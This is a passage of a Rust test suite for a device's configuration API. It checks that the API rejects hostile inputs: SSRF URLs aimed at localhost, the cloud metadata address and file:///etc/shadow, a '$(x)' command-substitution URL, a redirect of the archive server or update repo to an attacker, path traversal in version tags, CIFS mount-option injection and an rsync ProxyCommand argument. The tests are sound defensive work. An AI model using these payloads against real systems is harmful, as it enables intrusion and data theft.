            ("TRIGGER_FILE_SAVED", "ARCHIVE_UPLOADED"),
            ("AP_IP", "192.168.66.1"),
            ("TELEGRAM_CHAT_ID", "-1001234"),
            ("TELEGRAM_CHAT_ID", "@my_channel"),
            ("TESLA_BLE_VIN", "5YJ3E1EA4JF000001"),
        ] {
            assert!(validate_value(k, v).is_ok(), "{k}={v:?} was refused");
        }
    }

    #[test]
    fn notification_urls_cannot_point_at_the_pi_itself() {
        for v in [
            "http://127.0.0.1/api/system/reboot",
            "http://127.1/x",
            "http://2130706433/x",
            "http://0x7f000001/x",
            "http://localhost:80/api",
            "http://foo.localhost/",
            "http://[::1]/api",
            "http://[::ffff:127.0.0.1]/",
            "http://0.0.0.0/",
            "http://169.254.169.254/latest",
            "http://[fe80::1]/",
            "http://user@127.0.0.1/",
            "file:///etc/shadow",
            "gopher://nas/",
            "https://example.com/$(x)",
            "https://example.com/a b",
        ] {
            assert!(validate_value("WEBHOOK_URL", v).is_err(), "{v} was accepted");
        }
        for v in ["https://discord.com/api/webhooks/1/abc", "http://192.168.1.10:8080", "https://ntfy.example.com/topic", ""] {
            assert!(validate_value("WEBHOOK_URL", v).is_ok(), "{v} was refused");
        }
        // Written through the setup config, too.
        assert!(prepare_setup_config_write(
            &json!({"SSID": "Home", "ARCHIVE_SERVER": "nas.local", "GOTIFY_DOMAIN": "http://127.0.0.1:80"}),
            &stored()
        )
        .is_err());
    }

    #[test]
    fn archive_test_only_probes_the_stored_destination() {
        let mut a = stored();
        a.insert("ARCHIVE_SYSTEM".into(), "cifs".into());
        let t = |b: Value| check_write(Method::Post, "/api/setup/test-archive", &b, &a, "v3.29.0");
        // A new server, even with a password of its own.
        assert_eq!(
            t(json!({"ARCHIVE_SYSTEM": "cifs", "ARCHIVE_SERVER": "attacker.example", "SHARE_PASSWORD": "mine"})).unwrap_err().0,
            403
        );
        // A comma in the password would add mount options.
        assert!(t(json!({"ARCHIVE_SYSTEM": "cifs", "ARCHIVE_SERVER": "nas.local", "SHARE_PASSWORD": "x,ip=10.0.0.9"})).is_err());
        assert!(t(json!({"ARCHIVE_SYSTEM": "cifs", "ARCHIVE_SERVER": "nas.local", "SHARE_PASSWORD": "new-one"})).is_ok());
    }

    #[test]
    fn update_source_only_back_to_official() {
        let a = stored();
        let ok = |b: Value| check_write(Method::Put, "/api/system/update-source", &b, &a, "v3.29.0");
        assert_eq!(ok(json!({"repo": ""})).unwrap(), Some(json!({"repo": ""})));
        assert!(ok(json!({"repo": "sentry-six/sentry-usb-rusty"})).is_ok());
        assert_eq!(ok(json!({"repo": "attacker/Sentry-USB-Rusty"})).unwrap_err().0, 403);
        assert_eq!(ok(json!({"repo": "attacker"})).unwrap_err().0, 403);
        assert_eq!(ok(json!({})).unwrap_err().0, 403);
    }

    #[test]
    fn update_version_is_a_plain_tag() {
        let a = stored();
        let chk = |b: Value| check_write(Method::Post, "/api/system/update", &b, &a, "v3.29.0");
        assert!(chk(Value::Null).is_ok());
        assert!(chk(json!({"version": "v3.29.0-test.1"})).is_ok());
        for v in ["../../x", "v1/../../x", "https://evil/x", "a b", ""] {
            assert!(chk(json!({"version": v})).is_err(), "{v}");
        }
        // No downgrades; same or newer is fine.
        assert_eq!(chk(json!({"version": "v3.28.9"})).unwrap_err().0, 403);
        assert_eq!(chk(json!({"version": "v2.0.0"})).unwrap_err().0, 403);
        assert!(chk(json!({"version": "v3.29.0"})).is_ok());
        assert!(chk(json!({"version": "v3.30.0-beta.1"})).is_ok());
        assert!(chk(json!({"version": "nightly"})).is_err());
        assert_eq!(release_number("v3.29.0-test.1"), Some((3, 29, 0)));
    }

    #[test]
    fn preferences_that_install_or_repair_stay_local() {
        let a = stored();
        let p = |b: Value| check_write(Method::Put, "/api/config/preference", &b, &a, "");
        for k in ["update_channel", "auto_install_stable_updates", "storage_auto_force_repair", "storage_auto_repair"] {
            assert_eq!(p(json!({"key": k, "value": "prerelease"})).unwrap_err().0, 403, "{k}");
        }
        assert!(p(json!({"key": "../x", "value": 1})).is_err());
        assert!(p(json!({"key": "theme", "value": "x".repeat(70_000)})).is_err());
        assert_eq!(p(json!({"key": "theme", "value": "dark"})).unwrap(), None);
    }

    #[test]
    fn test_archive_fills_the_stored_password_and_checks_arguments() {
        let mut a = stored();
        a.insert("ARCHIVE_SYSTEM".into(), "cifs".into());
        let out = check_write(
            Method::Post,
            "/api/setup/test-archive",
            &json!({"ARCHIVE_SYSTEM": "cifs", "ARCHIVE_SERVER": "nas.local", "SHARE_PASSWORD": ""}),
            &a,
            "",
        )
        .unwrap()
        .unwrap();
        assert_eq!(out["SHARE_PASSWORD"], "share-secret");
        assert!(check_write(
            Method::Post,
            "/api/setup/test-archive",
            &json!({"ARCHIVE_SYSTEM": "rsync", "RSYNC_USER": "-oProxyCommand=x"}),
            &a,
            "",
        )
        .is_err());
    }
}
